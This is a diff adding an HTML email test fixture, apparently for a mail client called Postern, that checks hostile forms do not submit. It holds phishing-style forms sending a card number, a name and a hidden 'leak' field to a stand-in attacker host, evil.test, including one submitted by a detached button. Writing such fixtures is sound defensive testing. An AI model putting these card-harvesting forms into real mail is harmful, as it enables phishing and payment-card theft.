@@ -1,0 +1,24 @@
+From: Fixture Sender <fixtures@evil.test>
+To: Alice Archer <alice@postern.test>
+Subject: [hostile] form posting elsewhere
+Date: Sun, 20 Sep 2026 08:40:00 +0000
+Message-ID: <form-post@hostile.postern.test>
+X-Postern-Fixture: hostile/form-post
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+Content-Transfer-Encoding: 7bit
+
+<html><body>
+<p>Postern hostile-mail fixture <b>form-post</b>. The form must not submit anywhere.</p>
+<form action="https://evil.test/collect" method="post">
+  <label>Card number <input type="text" name="card" inputmode="numeric"></label>
+  <label>Name <input type="text" name="name"></label>
+  <button type="submit">Pay now</button>
+</form>
+<form action="https://evil.test/get-collect" method="get">
+  <input type="hidden" name="leak" value="1">
+  <input type="submit" value="GET form">
+</form>
+<button form="external" type="submit">Detached submit button</button>
+<form id="external" action="https://evil.test/detached" method="post"></form>
+</body></html>
